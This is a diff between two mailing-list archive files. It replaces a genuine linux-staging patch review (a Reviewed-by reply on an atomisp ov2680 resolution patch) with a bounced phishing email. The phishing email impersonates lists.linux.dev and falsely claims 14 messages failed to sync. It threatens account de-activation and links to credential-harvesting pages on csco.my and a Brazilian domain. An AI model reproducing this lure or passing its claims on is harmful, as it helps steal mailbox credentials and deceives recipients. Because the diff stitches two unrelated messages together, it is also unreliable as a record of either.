@@ -1,313 +1,240 @@
-Received: from us-smtp-delivery-124.mimecast.com (us-smtp-delivery-124.mimecast.com [170.10.133.124])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
-	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 7FAF82C81
-	for <linux-staging@lists.linux.dev>; Thu, 11 Nov 2021 10:04:05 +0000 (UTC)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=redhat.com;
-	s=mimecast20190719; t=1636625044;
-	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
-	 to:to:cc:cc:mime-version:mime-version:content-type:content-type:
-	 content-transfer-encoding:content-transfer-encoding:
-	 in-reply-to:in-reply-to:references:references;
-	bh=JOFY/pMl+gjqRrbEsS2cQzbRdYFmPaLIFRLa+9x1Qv0=;
-	b=hdRyD3R1yklItXLWUSTMrDAslQGS+CJ2Br9cQCjPsGuhop/94sWkHIfhwBsalRHUZuEDvG
-	ZrisT6cVkf1nUCSS0ryK+/AK07v3QUMS8UYZNnQDs2DHzbvcRMnyCrB0x9M0FIpYKT8yYd
-	JrwQznlb7WTawFR56dWxhvRAE2djvI8=
-Received: from mail-ed1-f71.google.com (mail-ed1-f71.google.com
- [209.85.208.71]) (Using TLS) by relay.mimecast.com with ESMTP id
- us-mta-36-zl1JiFZIOWi8a03mI886CQ-1; Thu, 11 Nov 2021 05:04:01 -0500
-X-MC-Unique: zl1JiFZIOWi8a03mI886CQ-1
-Received: by mail-ed1-f71.google.com with SMTP id s6-20020a056402520600b003e2dea4f9b4so4975347edd.12
-        for <linux-staging@lists.linux.dev>; Thu, 11 Nov 2021 02:04:00 -0800 (PST)
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20210112;
-        h=x-gm-message-state:message-id:date:mime-version:user-agent:subject
-         :content-language:to:cc:references:from:in-reply-to
-         :content-transfer-encoding;
-        bh=JOFY/pMl+gjqRrbEsS2cQzbRdYFmPaLIFRLa+9x1Qv0=;
-        b=zPYojPQPREHrTTyKROUAupsOrSJTWwMoIer7tCeQTdVPPGkIxeUNS44IzpoXeRU3+N
-         GntAao0CKUhYloza334JzXU5U2+uWWe0zAWlMcLRwW1p6nccGF+bDk2yOvCq4jEfdEyw
-         TNmWEO2ImsdEJy6AcazoowvFTGkCPXppKGiUUNjxKWiDDoFTf9RKsc8LA5IfgmvqbMwA
-         aHHqSC+es6HLCG+IhYax2i44Tl0O6qkaPAcpuixisCp7M0Cf6YV/8DpQVg7ObOc+1+BC
-         js/Nu/Sg0dCy57AnttpJ3H20TaN+m22lGb+JmuSDvGllhUDkZwJbEa7Xhrr8UlIDq1Z7
-         8bYA==
-X-Gm-Message-State: AOAM5328zNevgp1AlwmfopSCjz2XMWNnGebe0+OKMszmlX+BOGjtTcz+
-	a/9VA8Zi0TuAtXZqanEELIyvI8WuJ4zWGGvj/+P67bqlPDJ9AWjnpKcktvpKxkGVpwrPF+UMDae
-	dv/INmIVyhgYUeaY9rNIRYdnjfQ==
-X-Received: by 2002:aa7:c34d:: with SMTP id j13mr8132433edr.308.1636625039966;
-        Thu, 11 Nov 2021 02:03:59 -0800 (PST)
-X-Google-Smtp-Source: ABdhPJzJhwFGPJX1mI/fdmn9cabI9oViHdWx0uRivYkQqKgPiKUWPDCWy8I2w9AdrRKsp9cxc2CKeg==
-X-Received: by 2002:aa7:c34d:: with SMTP id j13mr8132397edr.308.1636625039743;
-        Thu, 11 Nov 2021 02:03:59 -0800 (PST)
-Received: from ?IPV6:2001:1c00:c1e:bf00:1054:9d19:e0f0:8214? (2001-1c00-0c1e-bf00-1054-9d19-e0f0-8214.cable.dynamic.v6.ziggo.nl. [2001:1c00:c1e:bf00:1054:9d19:e0f0:8214])
-        by smtp.gmail.com with ESMTPSA id u16sm1237510edr.43.2021.11.11.02.03.59
-        (version=TLS1_3 cipher=TLS_AES_128_GCM_SHA256 bits=128/128);
-        Thu, 11 Nov 2021 02:03:59 -0800 (PST)
-Message-ID: <f38e8b72-bc55-312f-ebd0-95c27b2daa8d@redhat.com>
-Date: Thu, 11 Nov 2021 11:03:58 +0100
+Received: from bizcloud-send.greenmatch.co.uk (unknown [159.223.62.209])
+	by smtp.subspace.kernel.org (Postfix) with ESMTP id 1366472
+	for <linux-staging@lists.linux.dev>; Thu, 11 Nov 2021 12:40:55 +0000 (UTC)
+Received: by bizcloud-send.greenmatch.co.uk (Postfix)
+	id 7CAF683DDE; Thu, 11 Nov 2021 12:18:52 +0000 (UTC)
+Date: Thu, 11 Nov 2021 12:18:52 +0000 (UTC)
+From: MAILER-DAEMON@bizcloud-send.greenmatch.co.uk (Mail Delivery System)
+Subject: Undelivered Mail Returned to Sender
+To: linux-staging@lists.linux.dev
+Auto-Submitted: auto-replied
 Precedence: bulk
 X-Mailing-List: linux-staging@lists.linux.dev
 List-Id: <linux-staging.lists.linux.dev>
 List-Subscribe: <mailto:linux-staging+subscribe@lists.linux.dev>
 List-Unsubscribe: <mailto:linux-staging+unsubscribe@lists.linux.dev>
 MIME-Version: 1.0
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101
- Thunderbird/91.2.0
-Subject: Re: [PATCH 1/2] media: atomisp-ov2680: uncomment other resolutions
-To: Mauro Carvalho Chehab <mchehab+huawei@kernel.org>
-Cc: linuxarm@huawei.com, mauro.chehab@huawei.com,
- Bhaskar Chowdhury <unixbhaskar@gmail.com>, Deepak R Varma <drv@mailo.com>,
- Greg Kroah-Hartman <gregkh@linuxfoundation.org>,
- Mauro Carvalho Chehab <mchehab@kernel.org>,
- Randy Dunlap <rdunlap@infradead.org>,
- Sakari Ailus <sakari.ailus@linux.intel.com>, linux-kernel@vger.kernel.org,
- linux-media@vger.kernel.org, linux-staging@lists.linux.dev
-References: <440a1ecd3e1ef3a58bff40cde2ae57a32e5b0f60.1636624633.git.mchehab+huawei@kernel.org>
-From: Hans de Goede <hdegoede@redhat.com>
-In-Reply-To: <440a1ecd3e1ef3a58bff40cde2ae57a32e5b0f60.1636624633.git.mchehab+huawei@kernel.org>
-Authentication-Results: relay.mimecast.com;
-	auth=pass smtp.auth=CUSA124A263 smtp.mailfrom=hdegoede@redhat.com
-X-Mimecast-Spam-Score: 0
-X-Mimecast-Originator: redhat.com
-Content-Language: en-US
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: 7bit
+Content-Type: multipart/report; report-type=delivery-status;
+	boundary="840F9CB0DA.1636633132/bizcloud-send.greenmatch.co.uk"
+Message-Id: <20211111121852.7CAF683DDE@bizcloud-send.greenmatch.co.uk>
 
-Hi,
+This is a MIME-encapsulated message.
 
-On 11/11/21 10:57, Mauro Carvalho Chehab wrote:
-> There are several resolutions defined for this sensor, but just
-> two are currently uncommented. Change the driver to allow other
-> resolutions to also be used.
-> 
-> Signed-off-by: Mauro Carvalho Chehab <mchehab+huawei@kernel.org>
+--840F9CB0DA.1636633132/bizcloud-send.greenmatch.co.uk
+Content-Description: Notification
+Content-Type: text/plain; charset=us-ascii
 
-Thanks, series looks good to me:
+This is the mail system at host bizcloud-send.greenmatch.co.uk.
 
-Reviewed-by: Hans de Goede <hdegoede@redhat.com>
+I'm sorry to have to inform you that your message could not
+be delivered to one or more recipients. It's attached below.
 
-for the series.
+For further assistance, please send mail to postmaster.
 
-Regards,
+If you do so, please include this problem report. You can
+delete your own text from the attached returned message.
 
-Hans
+                   The mail system
 
-> ---
->  drivers/staging/media/atomisp/i2c/ov2680.h | 159 ++++++++++++++++++++-
->  1 file changed, 153 insertions(+), 6 deletions(-)
-> 
-> diff --git a/drivers/staging/media/atomisp/i2c/ov2680.h b/drivers/staging/media/atomisp/i2c/ov2680.h
-> index e53be612a1e4..ed68510bb0b9 100644
-> --- a/drivers/staging/media/atomisp/i2c/ov2680.h
-> +++ b/drivers/staging/media/atomisp/i2c/ov2680.h
-> @@ -282,7 +282,6 @@ static struct ov2680_reg const ov2680_global_setting[] = {
->  	{}
->  };
->  
-> -#if 0 /* None of the definitions below are used currently */
->  /*
->   * 176x144 30fps  VBlanking 1lane 10Bit (binning)
->   */
-> @@ -442,7 +441,7 @@ static struct ov2680_reg const ov2680_656x496_30fps[] = {
->  };
->  
->  /*
-> - * 800x600 30fps  VBlanking 1lane 10Bit (binning)
-> + * 720x592 30fps  VBlanking 1lane 10Bit (binning)
->   */
->  static struct ov2680_reg const ov2680_720x592_30fps[] = {
->  	{0x3086, 0x01},
-> @@ -637,7 +636,6 @@ static struct ov2680_reg const ov2680_1456x1096_30fps[] = {
->  	// {0x5090, 0x0c},
->  	{}
->  };
-> -#endif
->  
->  /*
->   *1616x916  30fps  VBlanking 1lane 10bit
-> @@ -680,9 +678,8 @@ static struct ov2680_reg const ov2680_1616x916_30fps[] = {
->  };
->  
->  /*
-> - * 1612x1212 30fps VBlanking 1lane 10Bit
-> + * 1616x1082 30fps VBlanking 1lane 10Bit
->   */
-> -#if 0
->  static struct ov2680_reg const ov2680_1616x1082_30fps[] = {
->  	{0x3086, 0x00},
->  	{0x370a, 0x21},
-> @@ -718,7 +715,7 @@ static struct ov2680_reg const ov2680_1616x1082_30fps[] = {
->  	{0x5081, 0x41},
->  	{}
->  };
-> -#endif
-> +
->  /*
->   * 1616x1216 30fps VBlanking 1lane 10Bit
->   */
-> @@ -774,6 +771,21 @@ static struct ov2680_resolution ov2680_res_preview[] = {
->  		.skip_frames = 3,
->  		.regs = ov2680_1616x1216_30fps,
->  	},
-> +	{
-> +		.desc = "ov2680_1616x1082_30fps",
-> +		.width = 1616,
-> +		.height = 1082,
-> +		.pix_clk_freq = 66,
-> +		.fps = 30,
-> +		.used = 0,
-> +		.pixels_per_line = 1698,//1704,
-> +		.lines_per_frame = 1294,
-> +		.bin_factor_x = 0,
-> +		.bin_factor_y = 0,
-> +		.bin_mode = 0,
-> +		.skip_frames = 3,
-> +		.regs = ov2680_1616x1082_30fps,
-> +	},
->  	{
->  		.desc = "ov2680_1616x916_30fps",
->  		.width = 1616,
-> @@ -789,6 +801,141 @@ static struct ov2680_resolution ov2680_res_preview[] = {
->  		.skip_frames = 3,
->  		.regs = ov2680_1616x916_30fps,
->  	},
-> +	{
-> +		.desc = "ov2680_1456x1096_30fps",
-> +		.width = 1456,
-> +		.height = 1096,
-> +		.fps = 30,
-> +		.pix_clk_freq = 66,
-> +		.used = 0,
-> +		.pixels_per_line = 1698,//1704,
-> +		.lines_per_frame = 1294,
-> +		.bin_factor_x = 0,
-> +		.bin_factor_y = 0,
-> +		.bin_mode = 0,
-> +		.skip_frames = 3,
-> +		.regs = ov2680_1456x1096_30fps,
-> +	},
-> +	{
-> +		.desc = "ov2680_1296x976_30fps",
-> +		.width = 1296,
-> +		.height = 976,
-> +		.fps = 30,
-> +		.pix_clk_freq = 66,
-> +		.used = 0,
-> +		.pixels_per_line = 1698,//1704,
-> +		.lines_per_frame = 1294,
-> +		.bin_factor_x = 0,
-> +		.bin_factor_y = 0,
-> +		.bin_mode = 0,
-> +		.skip_frames = 3,
-> +		.regs = ov2680_1296x976_30fps,
-> +	},
-> +	{
-> +		.desc = "ov2680_720p_30fps",
-> +		.width = 1280,
-> +		.height = 720,
-> +		.fps = 30,
-> +		.pix_clk_freq = 66,
-> +		.used = 0,
-> +		.pixels_per_line = 1698,//1704,
-> +		.lines_per_frame = 1294,
-> +		.bin_factor_x = 0,
-> +		.bin_factor_y = 0,
-> +		.bin_mode = 0,
-> +		.skip_frames = 3,
-> +		.regs = ov2680_720p_30fps,
-> +	},
-> +	{
-> +		.desc = "ov2680_800x600_30fps",
-> +		.width = 800,
-> +		.height = 600,
-> +		.fps = 30,
-> +		.pix_clk_freq = 66,
-> +		.used = 0,
-> +		.pixels_per_line = 1698,//1704,
-> +		.lines_per_frame = 1294,
-> +		.bin_factor_x = 0,
-> +		.bin_factor_y = 0,
-> +		.bin_mode = 0,
-> +		.skip_frames = 3,
-> +		.regs = ov2680_800x600_30fps,
-> +	},
-> +	{
-> +		.desc = "ov2680_720x592_30fps",
-> +		.width = 720,
-> +		.height = 592,
-> +		.fps = 30,
-> +		.pix_clk_freq = 66,
-> +		.used = 0,
-> +		.pixels_per_line = 1698,//1704,
-> +		.lines_per_frame = 1294,
-> +		.bin_factor_x = 0,
-> +		.bin_factor_y = 0,
-> +		.bin_mode = 0,
-> +		.skip_frames = 3,
-> +		.regs = ov2680_720x592_30fps,
-> +	},
-> +	{
-> +		.desc = "ov2680_656x496_30fps",
-> +		.width = 656,
-> +		.height = 496,
-> +		.fps = 30,
-> +		.pix_clk_freq = 66,
-> +		.used = 0,
-> +		.pixels_per_line = 1698,//1704,
-> +		.lines_per_frame = 1294,
-> +		.bin_factor_x = 0,
-> +		.bin_factor_y = 0,
-> +		.bin_mode = 0,
-> +		.skip_frames = 3,
-> +		.regs = ov2680_656x496_30fps,
-> +	},
-> +	{
-> +		.desc = "ov2680_QVGA_30fps",
-> +		.width = 336,
-> +		.height = 256,
-> +		.fps = 30,
-> +		.pix_clk_freq = 66,
-> +		.used = 0,
-> +		.pixels_per_line = 1698,//1704,
-> +		.lines_per_frame = 1294,
-> +		.bin_factor_x = 0,
-> +		.bin_factor_y = 0,
-> +		.bin_mode = 0,
-> +		.skip_frames = 3,
-> +		.regs = ov2680_QVGA_30fps,
-> +	},
-> +	{
-> +		.desc = "ov2680_CIF_30fps",
-> +		.width = 352,
-> +		.height = 288,
-> +		.fps = 30,
-> +		.pix_clk_freq = 66,
-> +		.used = 0,
-> +		.pixels_per_line = 1698,//1704,
-> +		.lines_per_frame = 1294,
-> +		.bin_factor_x = 0,
-> +		.bin_factor_y = 0,
-> +		.bin_mode = 0,
-> +		.skip_frames = 3,
-> +		.regs = ov2680_CIF_30fps,
-> +	},
-> +	{
-> +		.desc = "ov2680_QCIF_30fps",
-> +		.width = 176,
-> +		.height = 144,
-> +		.fps = 30,
-> +		.pix_clk_freq = 66,
-> +		.used = 0,
-> +		.pixels_per_line = 1698,//1704,
-> +		.lines_per_frame = 1294,
-> +		.bin_factor_x = 0,
-> +		.bin_factor_y = 0,
-> +		.bin_mode = 0,
-> +		.skip_frames = 3,
-> +		.regs = ov2680_QCIF_30fps,
-> +	},
->  };
->  
->  #define N_RES_PREVIEW (ARRAY_SIZE(ov2680_res_preview))
-> 
+<linux-staging@lists.linux.dev>: host smtp.subspace.kernel.org[44.238.234.78]
+    said: 550 5.7.1 Blocked by SpamAssassin (in reply to end of DATA command)
 
+--840F9CB0DA.1636633132/bizcloud-send.greenmatch.co.uk
+Content-Description: Delivery report
+Content-Type: message/delivery-status
+
+Reporting-MTA: dns; bizcloud-send.greenmatch.co.uk
+X-Postfix-Queue-ID: 840F9CB0DA
+X-Postfix-Sender: rfc822; linux-staging@lists.linux.dev
+Arrival-Date: Thu, 11 Nov 2021 11:38:33 +0000 (UTC)
+
+Final-Recipient: rfc822; linux-staging@lists.linux.dev
+Original-Recipient: rfc822;linux-staging@lists.linux.dev
+Action: failed
+Status: 5.7.1
+Remote-MTA: dns; smtp.subspace.kernel.org
+Diagnostic-Code: smtp; 550 5.7.1 Blocked by SpamAssassin
+
+--840F9CB0DA.1636633132/bizcloud-send.greenmatch.co.uk
+Content-Description: Undelivered Message
+Content-Type: message/rfc822
+
+Return-Path: <linux-staging@lists.linux.dev>
+Received: from 163.com (bizcloud-send.greenmatch.co.uk [IPv6:::1])
+	by bizcloud-send.greenmatch.co.uk (Postfix) with ESMTP id 840F9CB0DA
+	for <linux-staging@lists.linux.dev>; Thu, 11 Nov 2021 11:38:33 +0000 (UTC)
+From: e-Mail Server lists.linux.dev <linux-staging@lists.linux.dev>
+To: linux-staging@lists.linux.dev
+Subject: At 11/11/2021 11:38:31 a.m. linux-staging@lists.linux.dev failed to sync and returned 14 incoming messages.
+Date: 11 Nov 2021 11:38:31 -0800
+Message-ID: <20211111113831.B7970036F2451BB6@lists.linux.dev>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.19003"></HEAD>
+<body style=3D"MARGIN: 0.5em">
+<P><SPAN style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-ser=
+if; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIG=
+HT: 400; COLOR: rgb(19,79,92); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; L=
+ETTER-SPACING: normal; TEXT-INDENT: 0px; -webkit-text-stroke-width: 0px; te=
+xt-decoration-thickness: initial; text-decoration-style: initial; text-deco=
+ration-color: initial; font-variant-ligatures: normal; font-variant-caps: n=
+ormal">
+<SPAN style=3D"FONT-FAMILY: tahoma, sans-serif"><B><FONT size=3D2><FONT col=
+or=3D#212121><FONT face=3D"wf_segoe-ui_normal, Segoe UI, Segoe WP, Tahoma, =
+Arial, sans-serif, serif, EmojiFont">At 11/11/2021 11:38:31 a.m.</FONT></FO=
+NT></FONT></B></SPAN></SPAN><FONT size=3D3>
+<FONT style=3D"FONT-SIZE: small; WHITE-SPACE: normal; WORD-SPACING: 0px; TE=
+XT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: nor=
+mal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; -webk=
+it-text-stroke-width: 0px; text-decoration-thickness: initial; text-decorat=
+ion-style: initial; text-decoration-color: initial; font-variant-ligatures:=
+ normal; font-variant-caps: normal" face=3D"wf_segoe-ui_normal, Segoe UI, S=
+egoe WP, Tahoma, Arial, sans-serif, serif, EmojiFont">
+<FONT color=3D#212121><SPAN>&nbsp;</SPAN>Your mail account</FONT><SPAN>&nbs=
+p;</SPAN></FONT>
+<B style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; WH=
+ITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; COLOR: rgb(34,3=
+4,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; T=
+EXT-INDENT: 0px; -webkit-text-stroke-width: 0px; text-decoration-thickness:=
+ initial; text-decoration-style: initial; text-decoration-color: initial; f=
+ont-variant-ligatures: normal; font-variant-caps: normal"><SPAN style=3D"CO=
+LOR: rgb(7,55,99)">
+<FONT face=3D"comic sans ms, sans-serif">linux-staging@lists.linux.dev<SPAN=
+>&nbsp;</SPAN></FONT></SPAN></B>
+<FONT style=3D"FONT-SIZE: small; WHITE-SPACE: normal; WORD-SPACING: 0px; TE=
+XT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(33,33,33); FONT-STYLE: nor=
+mal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; -webk=
+it-text-stroke-width: 0px; text-decoration-thickness: initial; text-decorat=
+ion-style: initial; text-decoration-color: initial; font-variant-ligatures:=
+ normal; font-variant-caps: normal" face=3D"wf_segoe-ui_normal, Segoe UI, S=
+egoe WP, Tahoma, Arial, sans-serif, serif, EmojiFont">
+failed to sync and returned&nbsp;14 incoming messages.</FONT>
+<BR style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; W=
+HITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 4=
+00; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER=
+-SPACING: normal; TEXT-INDENT: 0px; -webkit-text-stroke-width: 0px; text-de=
+coration-thickness: initial; text-decoration-style: initial; text-decoratio=
+n-color: initial; font-variant-ligatures: normal; font-variant-caps: normal=
+"></FONT></P>
+<P style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; WH=
+ITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 40=
+0; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-=
+SPACING: normal; TEXT-INDENT: 0px; -webkit-text-stroke-width: 0px; text-dec=
+oration-thickness: initial; text-decoration-style: initial; text-decoration=
+-color: initial; font-variant-ligatures: normal; font-variant-caps: normal"=
+>
+<FONT color=3D#212121 face=3D"wf_segoe-ui_normal, Segoe UI, Segoe WP, Tahom=
+a, Arial, sans-serif, serif, EmojiFont"><BR></FONT><FONT face=3D"Segoe UI">=
+<FONT color=3D#212121 face=3D"wf_segoe-ui_normal, Segoe UI, Segoe WP, Tahom=
+a, Arial, sans-serif, serif, EmojiFont">Sync Failures<SPAN>&nbsp;</SPAN></F=
+ONT><FONT color=3D#212121>Occur<FONT face=3D"wf_segoe-ui_normal, Segoe UI, =
+Segoe WP, Tahoma, Arial, sans-serif, serif, EmojiFont">&nbsp;when a Mail us=
+er has not Upgraded his/her Mail account in 90 days.</FONT>
+</FONT></FONT><BR><BR><FONT color=3D#212121 face=3D"wf_segoe-ui_normal, Seg=
+oe UI, Segoe WP, Tahoma, Arial, sans-serif, serif, EmojiFont">To avoid<SPAN=
+>&nbsp;</SPAN></FONT><SPAN style=3D'FONT-FAMILY: wf_segoe-ui_normal, "Segoe=
+ UI", "Segoe WP", Tahoma, Arial, sans-serif, serif, EmojiFont; COLOR: rgb(3=
+3,33,33)'>De-activation</SPAN><SPAN style=3D'FONT-FAMILY: wf_segoe-ui_norma=
+l, "Segoe UI", "Segoe WP", Tahoma, Arial, sans-serif, serif, EmojiFont; COL=
+OR: rgb(33,33,33)'><SPAN>&nbsp;</SPAN>
+&nbsp;of this email account kindly click below to retrieve pending messages=
+ back to your inbox.</SPAN>&nbsp;</P>
+<P style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; WH=
+ITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 40=
+0; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-=
+SPACING: normal; TEXT-INDENT: 0px; -webkit-text-stroke-width: 0px; text-dec=
+oration-thickness: initial; text-decoration-style: initial; text-decoration=
+-color: initial; font-variant-ligatures: normal; font-variant-caps: normal"=
+><FONT size=3D4><BR></FONT></P>
+<P>
+<table style=3D"FONT-SIZE: small; FONT-FAMILY: inherit; WHITE-SPACE: normal=
+; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(33,=
+33,33); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; =
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial; font-variant-ligat=
+ures: normal; font-variant-caps: normal" cellspacing=3D"0" width=3D"222" bo=
+rder=3D"0">
+<TBODY>
+<TR>
+<td style=3D"FONT-FAMILY: Roboto, RobotoDraft, Helvetica, Arial, sans-serif=
+; MIN-WIDTH: 50px; PADDING-BOTTOM: 5px; PADDING-TOP: 5px; PADDING-LEFT: 20p=
+x; MARGIN: 0px; PADDING-RIGHT: 20px; BACKGROUND-COLOR: rgb(38,114,236)" bgc=
+olor=3D"#2672ec">
+<A=20
+id=3Dm_-2735216190773473026m_7688023744981963105m_-2747434789673681655m_-26=
+95728303306092925m_-2462437844142065484m_5552741257275493221m_6854519858230=
+751297m_6426349188608686206m_134328779938242058m_2459268047199016810m_45393=
+84547796153801m_-4688376377697068719m_8622671655683097688m_6129413375698154=
+328m_-6251460549130664813m_-5461020610684499898m_8683060279241883465m_-1659=
+289910593478596m_-1028509589754556938m_-2719343519354704846m_87774325118596=
+13391m_-3374688461794081709m_-2627279561011226652m_-
+5843828333752367546m_1228592353398213615m_2165313473444410753m_-49610170986=
+95404152m_-7537997691382674081m_8817883430050674859m_8397794827104674018m_-=
+7856965124795846601gmail-m_521898264711154108m_-3874954161631330105m_779863=
+9846727344362m_8228523851914702159gmail-m_-6794887958146511059m_30679883440=
+08626957m_-1136776643231973633m_-2450167051005763152m_-2002536060826220612m=
+_-8551308050579542515m_-1150364680115986047m_-5789638306153986747m_77123017=
+88687381273m_835837614516869233m_-8403454542672139
+668m_-1220449622731522563m_2544434100301976007m_-856292430060893447m_370150=
+4942798119637m_-7459359542057316429m_-1026562016849056076m_9947552977823649=
+3m_8952700678076 style=3D'BORDER-LEFT-WIDTH: 0px; FONT-FAMILY: "Segoe UI"; =
+BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px=
+; FONT-WEIGHT: 600; COLOR: rgb(255,255,255); PADDING-BOTTOM: 0px; TEXT-ALIG=
+N: center; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LETTER-SPACING=
+: 0.02em; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH:=20
+0px; text-decoration-line: none' href=3D"https://csco.my/csco.my/update-21/=
+#linux-staging@lists.linux.dev" rel=3D"noopener noreferrer" target=3D_blank=
+ data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://drresolveco=
+ntroledepragas.com.br/wp-contents/pak/%23%5B%5B-Email-%5D%5D&amp;source=3Dg=
+mail&amp;ust=3D1636620362023000&amp;usg=3DAFQjCNHB3zDZ_U6nY5liL2Hr1Gs9XFrlt=
+A"><FONT size=3D4>Resolve Here</FONT></A></TD></TR></TBODY></TABLE></P>
+<P style=3D'FONT-SIZE: small; FONT-FAMILY: wf_segoe-ui_normal, "Segoe UI", =
+"Segoe WP", Tahoma, Arial, sans-serif, serif, EmojiFont; WHITE-SPACE: norma=
+l; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(33=
+,33,33); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal;=
+ TEXT-INDENT: 0px; -webkit-text-stroke-width: 0px; text-decoration-thicknes=
+s: initial; text-decoration-style: initial; text-decoration-color: initial;=
+ font-variant-ligatures: normal; font-variant-caps:=20
+normal'><BR></P>
+<P style=3D'FONT-SIZE: small; FONT-FAMILY: wf_segoe-ui_normal, "Segoe UI", =
+"Segoe WP", Tahoma, Arial, sans-serif, serif, EmojiFont; WHITE-SPACE: norma=
+l; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(33=
+,33,33); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal;=
+ TEXT-INDENT: 0px; -webkit-text-stroke-width: 0px; text-decoration-thicknes=
+s: initial; text-decoration-style: initial; text-decoration-color: initial;=
+ font-variant-ligatures: normal; font-variant-caps:=20
+normal'><FONT face=3D"Segoe UI">To verify your account in one simple step a=
+nd prevent a re-occurrence, please&nbsp;<FONT size=3D4><A style=3D"COLOR: r=
+gb(17,85,204)" href=3D"https://csco.my/csco.my/update-21/#linux-staging@lis=
+ts.linux.dev" rel=3D"noopener noreferrer" target=3D_blank data-saferedirect=
+url=3D"https://www.google.com/url?q=3Dhttps://drresolvecontroledepragas.com=
+=2Ebr/wp-contents/pak/%23%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D1=
+636620362023000&amp;usg=3DAFQjCNHB3zDZ_U6nY5liL2Hr1Gs9XFrltA">click here</A=
+>.</FONT></FONT>
+<BR><BR></P>
+<P style=3D'FONT-SIZE: small; FONT-FAMILY: wf_segoe-ui_normal, "Segoe UI", =
+"Segoe WP", Tahoma, Arial, sans-serif, serif, EmojiFont; WHITE-SPACE: norma=
+l; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(33=
+,33,33); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal;=
+ TEXT-INDENT: 0px; -webkit-text-stroke-width: 0px; text-decoration-thicknes=
+s: initial; text-decoration-style: initial; text-decoration-color: initial;=
+ font-variant-ligatures: normal; font-variant-caps:=20
+normal'><BR></P>
+<P style=3D'FONT-SIZE: small; FONT-FAMILY: wf_segoe-ui_normal, "Segoe UI", =
+"Segoe WP", Tahoma, Arial, sans-serif, serif, EmojiFont; WHITE-SPACE: norma=
+l; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(33=
+,33,33); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal;=
+ TEXT-INDENT: 0px; -webkit-text-stroke-width: 0px; text-decoration-thicknes=
+s: initial; text-decoration-style: initial; text-decoration-color: initial;=
+ font-variant-ligatures: normal; font-variant-caps:=20
+normal'><B>&copy;<FONT size=3D+0>2021 lists.linux.dev.</FONT></B></P></BODY=
+></HTML>
+
+--840F9CB0DA.1636633132/bizcloud-send.greenmatch.co.uk--
